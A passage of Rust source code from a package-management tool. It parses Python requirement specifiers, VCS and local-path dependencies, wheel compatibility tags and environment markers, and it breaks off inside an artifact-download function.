    static CURRENT_PYTHON_WHEEL_COMPATIBILITY: OnceLock<Option<PythonWheelCompatibility>> =
        OnceLock::new();
    CURRENT_PYTHON_WHEEL_COMPATIBILITY
        .get_or_init(detect_python_wheel_compatibility)
        .clone()
}

fn detect_python_version() -> Option<String> {
    let output = Command::new("python3")
        .arg("-c")
        .arg(
            "import sys; print(f'{sys.version_info.major}.{sys.version_info.minor}.{sys.version_info.micro}')",
        )
        .output()
        .ok()?;
    if !output.status.success() {
        return None;
    }
    let version = String::from_utf8(output.stdout).ok()?.trim().to_owned();
    (!version.is_empty()).then_some(version)
}

fn detect_python_wheel_compatibility() -> Option<PythonWheelCompatibility> {
    let output = Command::new("python3")
        .arg("-c")
        .arg(
            r#"import platform, sys, sysconfig
print(sys.version_info.major)
print(sys.version_info.minor)
print(sys.implementation.name)
print(sys.implementation.cache_tag or "")
print(sysconfig.get_platform())
print(platform.machine())
print(platform.mac_ver()[0])
"#,
        )
        .output()
        .ok()?;
    if !output.status.success() {
        return None;
    }
    let stdout = String::from_utf8(output.stdout).ok()?;
    let mut lines = stdout.lines();
    let major = lines.next()?.trim().parse::<u64>().ok()?;
    let minor = lines.next()?.trim().parse::<u64>().ok()?;
    let implementation = lines.next()?.trim().to_owned();
    let cache_tag = lines.next()?.trim().to_owned();
    let platform = normalize_wheel_platform(lines.next()?.trim());
    let machine = normalize_wheel_platform(lines.next()?.trim());
    let mac_version = lines.next().unwrap_or_default().trim().to_owned();

    Some(PythonWheelCompatibility::new(
        major,
        minor,
        &implementation,
        &cache_tag,
        &platform,
        &machine,
        &mac_version,
    ))
}

#[derive(Debug, Clone)]
struct PythonWheelCompatibility {
    python_tags: BTreeSet<String>,
    abi_tags: BTreeSet<String>,
    platform_tags: BTreeSet<String>,
}

impl PythonWheelCompatibility {
    fn new(
        major: u64,
        minor: u64,
        implementation: &str,
        cache_tag: &str,
        platform: &str,
        machine: &str,
        mac_version: &str,
    ) -> Self {
        let mut python_tags = BTreeSet::from([format!("py{major}"), format!("py{major}{minor}")]);
        let mut abi_tags = BTreeSet::from(["none".to_owned(), "abi3".to_owned()]);
        if implementation == "cpython" {
            let cp_tag = format!("cp{major}{minor}");
            python_tags.insert(cp_tag.clone());
            abi_tags.insert(cp_tag);
        }
        if let Some(cache_tag) = cache_tag
            .strip_prefix("cpython-")
            .map(|tag| format!("cp{}", tag.replace('-', "")))
        {
            python_tags.insert(cache_tag.clone());
            abi_tags.insert(cache_tag);
        }

        let mut platform_tags = BTreeSet::from(["any".to_owned()]);
        if !platform.is_empty() {
            platform_tags.insert(platform.to_owned());
        }
        platform_tags.extend(macos_platform_tags(platform, machine, mac_version));

        Self {
            python_tags,
            abi_tags,
            platform_tags,
        }
    }
}

fn macos_platform_tags(platform: &str, machine: &str, mac_version: &str) -> BTreeSet<String> {
    let mut tags = BTreeSet::new();
    if !platform.starts_with("macosx_") {
        return tags;
    }

    let current_major = mac_version
        .split('.')
        .next()
        .and_then(|part| part.parse::<u64>().ok())
        .filter(|major| *major >= 11)
        .unwrap_or(15);

    for minor in 0..=16 {
        tags.insert(format!("macosx_10_{minor}_universal2"));
        if machine == "x86_64" {
            tags.insert(format!("macosx_10_{minor}_x86_64"));
            tags.insert(format!("macosx_10_{minor}_intel"));
        }
    }

    for major in 11..=current_major {
        tags.insert(format!("macosx_{major}_0_universal2"));
        if machine == "arm64" || machine == "aarch64" {
            tags.insert(format!("macosx_{major}_0_arm64"));
        }
        if machine == "x86_64" {
            tags.insert(format!("macosx_{major}_0_x86_64"));
        }
    }

    tags
}

fn normalize_wheel_platform(value: &str) -> String {
    value.replace(['-', '.'], "_")
}

#[derive(Debug, Clone, PartialEq, Eq)]
struct WheelTags {
    python_tags: BTreeSet<String>,
    abi_tags: BTreeSet<String>,
    platform_tags: BTreeSet<String>,
}

fn parse_wheel_tags(filename: &str) -> Option<WheelTags> {
    let stem = filename.strip_suffix(".whl")?;
    let parts = stem.rsplitn(4, '-').collect::<Vec<_>>();
    if parts.len() != 4 {
        return None;
    }

    Some(WheelTags {
        platform_tags: dot_tags(parts[0]),
        abi_tags: dot_tags(parts[1]),
        python_tags: dot_tags(parts[2]),
    })
}

fn dot_tags(value: &str) -> BTreeSet<String> {
    value.split('.').map(str::to_owned).collect()
}

fn wheel_tag_compatible(filename: &str, compatibility: &PythonWheelCompatibility) -> bool {
    let Some(tags) = parse_wheel_tags(filename) else {
        return false;
    };

    tags.python_tags
        .iter()
        .any(|tag| compatibility.python_tags.contains(tag))
        && tags
            .abi_tags
            .iter()
            .any(|tag| compatibility.abi_tags.contains(tag))
        && tags
            .platform_tags
            .iter()
            .any(|tag| compatibility.platform_tags.contains(tag))
}

fn pypi_comparator_satisfied(version: &str, comparator: &str) -> bool {
    for op in [">=", "<=", "==", "!=", "~=", ">", "<"] {
        if let Some(required) = comparator.strip_prefix(op) {
            let ordering = compare_pypi_versions(version, required.trim());
            return match op {
                ">=" => ordering.is_ge(),
                "<=" => ordering.is_le(),
                "==" => ordering.is_eq(),
                "!=" => !ordering.is_eq(),
                ">" => ordering.is_gt(),
                "<" => ordering.is_lt(),
                "~=" => ordering.is_ge(),
                _ => false,
            };
        }
    }

    compare_pypi_versions(version, comparator).is_eq()
}

fn compare_pypi_versions(left: &str, right: &str) -> std::cmp::Ordering {
    comparable_version(left).cmp(&comparable_version(right))
}

fn comparable_version(version: &str) -> Vec<u64> {
    version
        .split(|ch: char| !ch.is_ascii_digit())
        .filter(|part| !part.is_empty())
        .map(|part| part.parse().unwrap_or(0))
        .collect()
}

fn parse_pypi_requirement(requirement: &str) -> Option<PackageSpec> {
    parse_pypi_requirement_with_extras(requirement, &BTreeSet::new())
}

fn parse_pypi_direct_requirement(
    requirement: &str,
    active_extras: &BTreeSet<String>,
) -> Option<(PackageSpec, BTreeSet<String>)> {
    let mut parts = requirement.splitn(2, ';');
    let requirement = parts.next()?.trim();
    if let Some(marker) = parts.next() {
        if !pypi_marker_applies(marker, active_extras) {
            return None;
        }
    }

    let (name, url) = requirement.split_once(" @ ")?;
    let (name, extras) = parse_pypi_name_and_extras(name.trim());
    if name.is_empty() {
        return None;
    }
    let (url, hashes) = direct_requirement_url_and_hashes(url.trim());
    if !url.contains("://") {
        return None;
    }
    Some((
        PackageSpec::with_direct_url(Ecosystem::Pypi, name, url, extras),
        hashes,
    ))
}

fn parse_pypi_local_direct_requirement(
    requirement: &str,
    active_extras: &BTreeSet<String>,
    base_dir: &Path,
) -> Result<Option<(PackageSpec, BTreeSet<String>)>> {
    let mut parts = requirement.splitn(2, ';');
    let requirement = parts.next().unwrap_or_default().trim();
    if let Some(marker) = parts.next() {
        if !pypi_marker_applies(marker, active_extras) {
            return Ok(None);
        }
    }

    let Some((name, path)) = requirement.split_once(" @ ") else {
        return Ok(None);
    };
    let (name, extras) = parse_pypi_name_and_extras(name.trim());
    if name.is_empty() {
        return Ok(None);
    }
    let Some((url, hashes, _)) = local_pypi_archive_url_and_hashes(path.trim(), base_dir)? else {
        return Ok(None);
    };
    Ok(Some((
        PackageSpec::with_direct_url(Ecosystem::Pypi, name, url, extras),
        hashes,
    )))
}

enum PypiProjectRequirement {
    Spec(PackageSpec, BTreeSet<String>),
    LocalPath(PathBuf),
    Vcs(PythonVcsRequirement),
}

fn collect_pypi_project_requirement(
    requirements: &mut ProjectRequirements,
    requirement: &str,
    active_extras: &BTreeSet<String>,
    base_dir: &Path,
    local_sources: &BTreeMap<String, PathBuf>,
) -> Result<()> {
    let Some(requirement) =
        parse_pypi_project_requirement(requirement, active_extras, base_dir, local_sources)?
    else {
        return Ok(());
    };

    match requirement {
        PypiProjectRequirement::Spec(spec, hashes) => {
            if !hashes.is_empty() {
                requirements
                    .hashes
                    .entry(spec.constraint_key())
                    .or_default()
                    .extend(hashes);
            }
            requirements.specs.push(spec);
        }
        PypiProjectRequirement::LocalPath(path) => {
            requirements.python_local_paths.push(path);
        }
        PypiProjectRequirement::Vcs(vcs) => {
            requirements.python_vcs_requirements.push(vcs);
        }
    }

    Ok(())
}

fn parse_pypi_project_requirement(
    requirement: &str,
    active_extras: &BTreeSet<String>,
    base_dir: &Path,
    local_sources: &BTreeMap<String, PathBuf>,
) -> Result<Option<PypiProjectRequirement>> {
    if let Some(vcs) = parse_pypi_vcs_direct_requirement(requirement, active_extras)? {
        return Ok(Some(PypiProjectRequirement::Vcs(vcs)));
    }

    let direct_requirement = parse_pypi_direct_requirement(requirement, active_extras).or(
        parse_pypi_local_direct_requirement(requirement, active_extras, base_dir)?,
    );
    if let Some((spec, hashes)) = direct_requirement {
        if let Some(path) = pypi_direct_file_url_local_directory(spec.direct_url.as_deref())? {
            return Ok(Some(PypiProjectRequirement::LocalPath(path)));
        }
        return Ok(Some(PypiProjectRequirement::Spec(spec, hashes)));
    }

    if let Some(path) =
        parse_pypi_local_direct_path_requirement(requirement, active_extras, base_dir)?
    {
        return Ok(Some(PypiProjectRequirement::LocalPath(path)));
    }

    if pypi_direct_reference_applies(requirement, active_extras) {
        return Err(OmcRegistryError::UnsupportedRequirement(
            requirement.to_owned(),
        ));
    }

    let Some(spec) = parse_pypi_requirement_with_extras(requirement, active_extras) else {
        return Ok(None);
    };
    if let Some(path) = local_sources.get(&spec.name) {
        if !path.is_dir() {
            return Err(OmcRegistryError::UnsupportedRequirement(format!(
                "uv local source `{}` must point to an existing directory",
                path.display()
            )));
        }
        return Ok(Some(PypiProjectRequirement::LocalPath(path.clone())));
    }

    Ok(Some(PypiProjectRequirement::Spec(spec, BTreeSet::new())))
}

fn pypi_direct_file_url_local_directory(direct_url: Option<&str>) -> Result<Option<PathBuf>> {
    let Some(direct_url) = direct_url else {
        return Ok(None);
    };
    let Ok(url) = reqwest::Url::parse(direct_url) else {
        return Ok(None);
    };
    if url.scheme() != "file" {
        return Ok(None);
    }
    let path = url
        .to_file_path()
        .map_err(|_| OmcRegistryError::UnsupportedRequirement(direct_url.to_owned()))?;
    Ok(path.is_dir().then_some(path))
}

fn parse_pypi_vcs_direct_requirement(
    requirement: &str,
    active_extras: &BTreeSet<String>,
) -> Result<Option<PythonVcsRequirement>> {
    let mut parts = requirement.splitn(2, ';');
    let requirement = parts.next().unwrap_or_default().trim();
    if let Some(marker) = parts.next() {
        if !pypi_marker_applies(marker, active_extras) {
            return Ok(None);
        }
    }

    let Some((name, url)) = requirement.split_once(" @ ") else {
        return Ok(None);
    };
    let (name, extras) = parse_pypi_name_and_extras(name.trim());
    if name.is_empty() {
        return Ok(None);
    }
    parse_python_vcs_requirement(Some((name, extras)), url.trim(), None, false)
}

fn parse_requirements_editable_vcs_requirement(
    value: &str,
) -> Result<Option<PythonVcsRequirement>> {
    parse_python_vcs_requirement(None, value, None, false)
}

fn parse_requirements_bare_vcs_requirement(
    requirement: &str,
    active_extras: &BTreeSet<String>,
) -> Result<Option<PythonVcsRequirement>> {
    let mut parts = requirement.splitn(2, ';');
    let requirement = parts.next().unwrap_or_default().trim();
    if let Some(marker) = parts.next() {
        if !pypi_marker_applies(marker, active_extras) {
            return Ok(None);
        }
    }
    parse_python_vcs_requirement(None, requirement, None, false)
}

fn parse_python_vcs_requirement(
    name_and_extras: Option<(String, BTreeSet<String>)>,
    value: &str,
    reference_override: Option<String>,
    allow_plain_git_url: bool,
) -> Result<Option<PythonVcsRequirement>> {
    let (raw_url, fragment) = value.split_once('#').unwrap_or((value, ""));
    let raw_url = raw_url.trim();
    let Some(url) = normalize_python_vcs_url(raw_url, allow_plain_git_url) else {
        return Ok(None);
    };
    let (url, reference_from_url) = split_python_vcs_url_reference(&url);
    let reference = reference_override
        .filter(|reference| !reference.trim().is_empty())
        .or(reference_from_url);
    let subdirectory = python_vcs_fragment_value(fragment, "subdirectory")
        .filter(|subdirectory| !subdirectory.trim().is_empty())
        .map(PathBuf::from);

    let (name, extras) = if let Some((name, extras)) = name_and_extras {
        (name, extras)
    } else {
        let Some(egg) = python_vcs_fragment_value(fragment, "egg") else {
            return Err(OmcRegistryError::UnsupportedRequirement(format!(
                "VCS requirement `{value}` must include #egg=name or use `name @ git+...`"
            )));
        };
        parse_pypi_name_and_extras(egg.trim())
    };
    if name.is_empty() {
        return Err(OmcRegistryError::UnsupportedRequirement(value.to_owned()));
    }

    Ok(Some(PythonVcsRequirement {
        name,
        url,
        reference,
        subdirectory,
        extras,
    }))
}

fn normalize_python_vcs_url(value: &str, allow_plain_git_url: bool) -> Option<String> {
    if let Some(url) = value.strip_prefix("git+") {
        let url = url.trim();
        return (!url.is_empty()).then(|| url.to_owned());
    }
    if allow_plain_git_url && looks_like_git_url(value) {
        return Some(value.to_owned());
    }
    None
}

fn looks_like_git_url(value: &str) -> bool {
    value.contains("://") || value.ends_with(".git") || value.starts_with("git@")
}

fn python_vcs_table_reference(
    reference: Option<String>,
    rev: Option<String>,
    branch: Option<String>,
    tag: Option<String>,
) -> Option<String> {
    reference
        .or(rev)
        .or(branch)
        .or(tag)
        .filter(|reference| !reference.trim().is_empty())
}

fn split_python_vcs_url_reference(url: &str) -> (String, Option<String>) {
    let Some(index) = url.rfind('@') else {
        return (url.to_owned(), None);
    };
    let last_slash = url.rfind('/').unwrap_or(0);
    if index <= last_slash {
        return (url.to_owned(), None);
    }
    let reference = url[index + 1..].trim();
    if reference.is_empty() {
        return (url.to_owned(), None);
    }
    (url[..index].to_owned(), Some(reference.to_owned()))
}

fn python_vcs_fragment_value(fragment: &str, key: &str) -> Option<String> {
    fragment.split('&').find_map(|part| {
        let (raw_key, raw_value) = part.split_once('=')?;
        let decoded_key = urlencoding::decode(raw_key).ok()?;
        if decoded_key != key {
            return None;
        }
        urlencoding::decode(raw_value)
            .ok()
            .map(|value| value.into_owned())
    })
}

fn parse_pypi_local_direct_path_requirement(
    requirement: &str,
    active_extras: &BTreeSet<String>,
    base_dir: &Path,
) -> Result<Option<PathBuf>> {
    let mut parts = requirement.splitn(2, ';');
    let requirement_body = parts.next().unwrap_or_default().trim();
    if let Some(marker) = parts.next() {
        if !pypi_marker_applies(marker, active_extras) {
            return Ok(None);
        }
    }

    let Some((name, path)) = requirement_body.split_once(" @ ") else {
        return Ok(None);
    };
    let (name, _) = parse_pypi_name_and_extras(name.trim());
    if name.is_empty() {
        return Ok(None);
    }
    let (path, _) = direct_requirement_url_and_hashes(path.trim());
    if path.contains("://") || is_pypi_archive_reference(&path) {
        return Ok(None);
    }
    let path = resolved_local_path(&path, base_dir);
    Ok(path.is_dir().then_some(path))
}

fn parse_pypi_local_path_requirement(
    requirement: &str,
    active_extras: &BTreeSet<String>,
    base_dir: &Path,
) -> Result<Option<PathBuf>> {
    let mut parts = requirement.splitn(2, ';');
    let requirement_body = parts.next().unwrap_or_default().trim();
    if let Some(marker) = parts.next() {
        if !pypi_marker_applies(marker, active_extras) {
            return Ok(None);
        }
    }

    if !looks_like_local_path_requirement(requirement_body)
        || requirement_body.contains("://")
        || is_pypi_archive_reference(requirement_body)
    {
        return Ok(None);
    }

    let path = normalize_requirements_editable_path(requirement_body, base_dir)?;
    if !path.is_dir() {
        return Err(OmcRegistryError::UnsupportedRequirement(
            requirement.to_owned(),
        ));
    }
    Ok(Some(path))
}

fn looks_like_local_path_requirement(value: &str) -> bool {
    let path = value.split('[').next().unwrap_or(value).trim();
    if path.is_empty() {
        return false;
    }
    Path::new(path).is_absolute()
        || matches!(path, "." | "..")
        || path.starts_with("./")
        || path.starts_with("../")
        || path.contains('/')
        || path.contains('\\')
}

fn pypi_direct_reference_applies(requirement: &str, active_extras: &BTreeSet<String>) -> bool {
    let mut parts = requirement.splitn(2, ';');
    let requirement = parts.next().unwrap_or_default().trim();
    if let Some(marker) = parts.next() {
        if !pypi_marker_applies(marker, active_extras) {
            return false;
        }
    }
    requirement.contains(" @ ")
}

fn parse_pypi_local_archive_requirement(
    requirement: &str,
    base_dir: &Path,
) -> Result<Option<(PackageSpec, BTreeSet<String>)>> {
    let Some((url, hashes, filename)) =
        local_pypi_archive_url_and_hashes(requirement.trim(), base_dir)?
    else {
        return Ok(None);
    };
    let name = if let Some((name, _version)) = parse_wheel_name_and_version(&filename) {
        name
    } else if let Some((name, _version)) = parse_sdist_name_and_version(&filename) {
        name
    } else {
        return Ok(None);
    };
    Ok(Some((
        PackageSpec::with_direct_url(Ecosystem::Pypi, name, url, BTreeSet::new()),
        hashes,
    )))
}

fn parse_pypi_direct_archive_url_reference(
    reference: &str,
) -> Result<Option<(PackageSpec, BTreeSet<String>)>> {
    let (source_url, hashes) = direct_requirement_url_and_hashes(reference.trim());
    let Ok(url) = reqwest::Url::parse(&source_url) else {
        return Ok(None);
    };
    if !matches!(url.scheme(), "https" | "file") {
        return Ok(None);
    }
    let filename = url
        .path_segments()
        .and_then(|mut segments| segments.next_back())
        .and_then(|filename| urlencoding::decode(filename).ok())
        .map(|filename| filename.into_owned())
        .ok_or_else(|| OmcRegistryError::UnsupportedRequirement(reference.to_owned()))?;
    let name = if let Some((name, _version)) = parse_wheel_name_and_version(&filename) {
        name
    } else if let Some((name, _version)) = parse_sdist_name_and_version(&filename) {
        name
    } else {
        return Ok(None);
    };
    Ok(Some((
        PackageSpec::with_direct_url(Ecosystem::Pypi, name, source_url, BTreeSet::new()),
        hashes,
    )))
}

fn local_pypi_archive_url_and_hashes(
    value: &str,
    base_dir: &Path,
) -> Result<Option<(String, BTreeSet<String>, String)>> {
    let (path, hashes) = direct_requirement_url_and_hashes(value);
    if path.contains("://") || !is_pypi_archive_reference(&path) {
        return Ok(None);
    }

    let path = Path::new(&path);
    let path = if path.is_absolute() {
        path.to_path_buf()
    } else {
        base_dir.join(path)
    };
    let filename = path
        .file_name()
        .and_then(|filename| filename.to_str())
        .ok_or_else(|| OmcRegistryError::UnsupportedRequirement(value.to_owned()))?
        .to_owned();
    let url = reqwest::Url::from_file_path(&path)
        .map_err(|_| OmcRegistryError::UnsupportedRequirement(value.to_owned()))?;
    Ok(Some((url.to_string(), hashes, filename)))
}

fn is_pypi_archive_reference(value: &str) -> bool {
    let (value, _) = direct_requirement_url_and_hashes(value.trim());
    let filename = value
        .rsplit_once('/')
        .map(|(_, filename)| filename)
        .unwrap_or(&value);
    is_pypi_archive_filename(filename)
}

fn is_pypi_archive_filename(filename: &str) -> bool {
    let lower = filename.to_ascii_lowercase();
    lower.ends_with(".whl") || is_python_sdist_filename(&lower)
}

fn direct_requirement_url_and_hashes(url: &str) -> (String, BTreeSet<String>) {
    let Some((url, fragment)) = url.split_once('#') else {
        return (url.to_owned(), BTreeSet::new());
    };
    let hashes = fragment
        .split('&')
        .filter_map(|part| {
            let (key, value) = part.split_once('=')?;
            if key != "sha256" {
                return None;
            }
            normalize_sha256_hash(&format!("sha256:{value}"))
        })
        .collect();
    (url.to_owned(), hashes)
}

fn parse_pypi_requirement_with_extras(
    requirement: &str,
    active_extras: &BTreeSet<String>,
) -> Option<PackageSpec> {
    let mut parts = requirement.splitn(2, ';');
    let requirement = parts.next()?.trim();
    if let Some(marker) = parts.next() {
        if !pypi_marker_applies(marker, active_extras) {
            return None;
        }
    }

    if requirement.is_empty() {
        return None;
    }

    let name_end = requirement
        .char_indices()
        .find(|(_, ch)| !ch.is_ascii_alphanumeric() && !matches!(ch, '-' | '_' | '.' | '[' | ']'))
        .map(|(index, _)| index)
        .unwrap_or(requirement.len());
    let (name, extras) = parse_pypi_name_and_extras(requirement[..name_end].trim());
    if name.is_empty() {
        return None;
    }

    let version = requirement[name_end..]
        .trim()
        .trim_start_matches('(')
        .trim_end_matches(')')
        .replace(' ', "");

    Some(PackageSpec::with_extras(
        Ecosystem::Pypi,
        name,
        (!version.is_empty()).then_some(version),
        extras,
    ))
}

fn parse_pypi_name_and_extras(name: &str) -> (String, BTreeSet<String>) {
    let Some((base, extras)) = name.split_once('[') else {
        return (normalize_pypi_name(name), BTreeSet::new());
    };
    let extras = extras
        .trim_end_matches(']')
        .split(',')
        .map(normalize_pypi_extra)
        .filter(|extra| !extra.is_empty())
        .collect::<BTreeSet<_>>();
    (normalize_pypi_name(base), extras)
}

fn normalize_pypi_name(name: &str) -> String {
    name.replace('_', "-").to_ascii_lowercase()
}

fn normalize_pypi_extra(extra: &str) -> String {
    extra.trim().replace('_', "-").to_ascii_lowercase()
}

fn parse_requirements_include(line: &str) -> Option<RequirementsInclude> {
    for (prefix, mode) in [
        ("--requirement=", RequirementsMode::Install),
        ("--constraint=", RequirementsMode::Constraint),
    ] {
        if let Some(rest) = line.strip_prefix(prefix) {
            let rest = rest.trim();
            if !rest.is_empty() {
                return Some(RequirementsInclude {
                    path: rest.to_owned(),
                    mode,
                });
            }
        }
    }

    for (prefix, mode) in [
        ("-r", RequirementsMode::Install),
        ("--requirement", RequirementsMode::Install),
        ("-c", RequirementsMode::Constraint),
        ("--constraint", RequirementsMode::Constraint),
    ] {
        if let Some(rest) = line.strip_prefix(prefix) {
            let rest = rest.trim_start();
            if rest.is_empty() {
                continue;
            }
            return Some(RequirementsInclude {
                path: rest.to_owned(),
                mode,
            });
        }
    }

    None
}

fn parse_requirements_index_url(line: &str) -> Option<String> {
    parse_requirements_option_value(line, &["--index-url=", "--index-url", "-i"])
        .and_then(|index_url| normalize_pypi_simple_index_url(&index_url))
}

fn parse_requirements_extra_index_url(line: &str) -> Option<String> {
    parse_requirements_option_value(line, &["--extra-index-url=", "--extra-index-url"])
        .and_then(|index_url| normalize_pypi_simple_index_url(&index_url))
}

fn parse_requirements_find_links(line: &str, base_dir: &Path) -> Option<String> {
    parse_requirements_option_value(line, &["--find-links=", "--find-links", "-f"])
        .and_then(|find_links| normalize_pypi_find_links_source(&find_links, base_dir))
}

fn parse_requirements_no_index(line: &str) -> bool {
    line == "--no-index"
}

fn parse_requirements_require_hashes(line: &str) -> bool {
    line == "--require-hashes"
}

fn parse_requirements_compatible_global_option(line: &str) -> bool {
    line == "--prefer-binary"
        || parse_requirements_option_value(line, &["--trusted-host=", "--trusted-host"]).is_some()
        || parse_requirements_option_value(line, &["--only-binary=", "--only-binary"]).is_some()
}

fn parse_requirements_editable_value(line: &str) -> Option<String> {
    parse_requirements_option_value(line, &["--editable=", "--editable", "-e"])
}

fn normalize_requirements_editable_path(value: &str, base_dir: &Path) -> Result<PathBuf> {
    let path = value.split_once('[').map(|(path, _)| path).unwrap_or(value);
    if path.contains("://") || path.starts_with("git+") {
        return Err(OmcRegistryError::UnsupportedRequirement(format!(
            "editable requirement `{value}` must be a local path"
        )));
    }
    let path = PathBuf::from(path);
    if path.is_absolute() {
        Ok(path)
    } else {
        Ok(base_dir.join(path))
    }
}

fn parse_requirements_option_value(line: &str, prefixes: &[&str]) -> Option<String> {
    for prefix in prefixes {
        if prefix.ends_with('=') {
            let Some(value) = line.strip_prefix(prefix) else {
                continue;
            };
            let value = value.trim();
            if !value.is_empty() {
                return Some(value.to_owned());
            }
        } else if line == *prefix || line.starts_with(&format!("{prefix} ")) {
            return shell_like_tokens(line)
                .get(1)
                .filter(|value| !value.is_empty())
                .cloned();
        }
    }
    None
}

fn normalize_pypi_find_links_source(value: &str, base_dir: &Path) -> Option<String> {
    let value = value.trim();
    if value.is_empty() {
        return None;
    }
    if reqwest::Url::parse(value).is_ok() {
        return Some(value.to_owned());
    }
    let path = Path::new(value);
    let path = if path.is_absolute() {
        path.to_path_buf()
    } else {
        base_dir.join(path)
    };
    Some(path.to_string_lossy().into_owned())
}

fn normalize_pypi_simple_index_url(value: &str) -> Option<String> {
    let value = value.trim();
    if value.is_empty() {
        None
    } else {
        Some(ensure_trailing_slash(value))
    }
}

#[derive(Debug, Clone)]
struct PypiMarkerEnvironment {
    python_full_version: Option<String>,
    os_name: String,
    sys_platform: String,
    platform_system: String,
    platform_machine: String,
    implementation_name: String,
    platform_python_implementation: String,
    extra: String,
}

impl PypiMarkerEnvironment {
    fn current() -> Self {
        Self {
            python_full_version: current_python_version(),
            os_name: os_name().to_owned(),
            sys_platform: sys_platform().to_owned(),
            platform_system: platform_system().to_owned(),
            platform_machine: std::env::consts::ARCH.to_owned(),
            implementation_name: "cpython".to_owned(),
            platform_python_implementation: "CPython".to_owned(),
            extra: String::new(),
        }
    }

    fn value(&self, name: &str) -> Option<String> {
        match name {
            "python_version" => self.python_full_version.as_deref().map(python_major_minor),
            "python_full_version" => self.python_full_version.clone(),
            "os_name" => Some(self.os_name.clone()),
            "sys_platform" => Some(self.sys_platform.clone()),
            "platform_system" => Some(self.platform_system.clone()),
            "platform_machine" => Some(self.platform_machine.clone()),
            "implementation_name" => Some(self.implementation_name.clone()),
            "platform_python_implementation" => Some(self.platform_python_implementation.clone()),
            "extra" => Some(self.extra.clone()),
            _ => None,
        }
    }
}

fn pypi_marker_applies(marker: &str, active_extras: &BTreeSet<String>) -> bool {
    let mut env = PypiMarkerEnvironment::current();
    if active_extras.is_empty() {
        return evaluate_pypi_marker(marker.trim(), &env).unwrap_or(true);
    }

    active_extras.iter().any(|extra| {
        env.extra.clone_from(extra);
        evaluate_pypi_marker(marker.trim(), &env).unwrap_or(true)
    })
}

fn evaluate_pypi_marker(marker: &str, env: &PypiMarkerEnvironment) -> Option<bool> {
    let mut saw_unknown_true_path = false;

    for or_group in split_marker_keyword(marker, "or") {
        let mut group_unknown = false;
        let mut group_matches = true;

        for atom in split_marker_keyword(or_group, "and") {
            match evaluate_pypi_marker_atom(atom, env) {
                Some(true) => {}
                Some(false) => {
                    group_matches = false;
                    break;
                }
                None => group_unknown = true,
            }
        }

        if group_matches && !group_unknown {
            return Some(true);
        }
        if group_matches {
            saw_unknown_true_path = true;
        }
    }

    if saw_unknown_true_path {
        None
    } else {
        Some(false)
    }
}

fn evaluate_pypi_marker_atom(atom: &str, env: &PypiMarkerEnvironment) -> Option<bool> {
    let atom = atom
        .trim()
        .trim_start_matches('(')
        .trim_end_matches(')')
        .trim();

    let (left, op, right) = split_marker_comparison(atom)?;
    let left = marker_operand_value(left, env)?;
    let right = marker_operand_value(right, env)?;

    match op {
        "==" => Some(left == right),
        "!=" => Some(left != right),
        "in" => Some(right.contains(&left)),
        "not in" => Some(!right.contains(&left)),
        ">=" | "<=" | ">" | "<" => {
            if looks_like_version(&left) && looks_like_version(&right) {
                let ordering = compare_pypi_versions(&left, &right);
                Some(match op {
                    ">=" => ordering.is_ge(),
                    "<=" => ordering.is_le(),
                    ">" => ordering.is_gt(),
                    "<" => ordering.is_lt(),
                    _ => false,
                })
            } else {
                Some(match op {
                    ">=" => left >= right,
                    "<=" => left <= right,
                    ">" => left > right,
                    "<" => left < right,
                    _ => false,
                })
            }
        }
        _ => None,
    }
}

fn split_marker_comparison(atom: &str) -> Option<(&str, &'static str, &str)> {
    for (needle, op) in [
        (" not in ", "not in"),
        (" in ", "in"),
        ("==", "=="),
        ("!=", "!="),
        (">=", ">="),
        ("<=", "<="),
        (">", ">"),
        ("<", "<"),
    ] {
        if let Some(index) = find_outside_quotes(atom, needle) {
            let left = atom[..index].trim();
            let right = atom[index + needle.len()..].trim();
            if !left.is_empty() && !right.is_empty() {
                return Some((left, op, right));
            }
        }
    }

    None
}

fn marker_operand_value(value: &str, env: &PypiMarkerEnvironment) -> Option<String> {
    let value = value.trim();
    if let Some(quoted) = unquote_marker_value(value) {
        return Some(quoted);
    }
    env.value(value)
}

fn unquote_marker_value(value: &str) -> Option<String> {
    let bytes = value.as_bytes();
    if bytes.len() >= 2
        && ((bytes[0] == b'\'' && bytes[bytes.len() - 1] == b'\'')
            || (bytes[0] == b'"' && bytes[bytes.len() - 1] == b'"'))
    {
        Some(value[1..value.len() - 1].to_owned())
    } else {
        None
    }
}

fn split_marker_keyword<'a>(marker: &'a str, keyword: &str) -> Vec<&'a str> {
    let separator = format!(" {keyword} ");
    let mut parts = Vec::new();
    let mut start = 0;
    let mut quote = None;
    let mut index = 0;

    while index < marker.len() {
        let ch = marker[index..].chars().next().unwrap_or_default();
        let ch_len = ch.len_utf8();

        if matches!(ch, '\'' | '"') {
            if quote == Some(ch) {
                quote = None;
            } else if quote.is_none() {
                quote = Some(ch);
            }
        }

        if quote.is_none() && marker[index..].to_ascii_lowercase().starts_with(&separator) {
            parts.push(marker[start..index].trim());
            index += separator.len();
            start = index;
            continue;
        }

        index += ch_len;
    }

    parts.push(marker[start..].trim());
    parts
}

fn find_outside_quotes(haystack: &str, needle: &str) -> Option<usize> {
    let mut quote = None;
    let mut index = 0;

    while index < haystack.len() {
        let ch = haystack[index..].chars().next().unwrap_or_default();
        let ch_len = ch.len_utf8();

        if matches!(ch, '\'' | '"') {
            if quote == Some(ch) {
                quote = None;
            } else if quote.is_none() {
                quote = Some(ch);
            }
        }

        if quote.is_none() && haystack[index..].starts_with(needle) {
            return Some(index);
        }

        index += ch_len;
    }

    None
}

fn python_major_minor(version: &str) -> String {
    let mut parts = version.split('.');
    let major = parts.next().unwrap_or("0");
    let minor = parts.next().unwrap_or("0");
    format!("{major}.{minor}")
}

fn looks_like_version(value: &str) -> bool {
    value
        .chars()
        .next()
        .map(|ch| ch.is_ascii_digit())
        .unwrap_or(false)
}

fn os_name() -> &'static str {
    if cfg!(windows) {
        "nt"
    } else {
        "posix"
    }
}

fn sys_platform() -> &'static str {
    if cfg!(target_os = "macos") {
        "darwin"
    } else if cfg!(target_os = "windows") {
        "win32"
    } else if cfg!(target_os = "linux") {
        "linux"
    } else {
        std::env::consts::OS
    }
}

fn platform_system() -> &'static str {
    if cfg!(target_os = "macos") {
        "Darwin"
    } else if cfg!(target_os = "windows") {
        "Windows"
    } else if cfg!(target_os = "linux") {
        "Linux"
    } else {
        std::env::consts::OS
    }
}

fn download_artifact(
    client: &Client,
    package: &ResolvedPackage,
    project_dir: &Path,
) -> Result<Vec<u8>> {
    if let Some(path) = &package.local_path {
        return Ok(fs::read(path)?);
    }
    let source_url = package
        .download_url
        .as_deref()
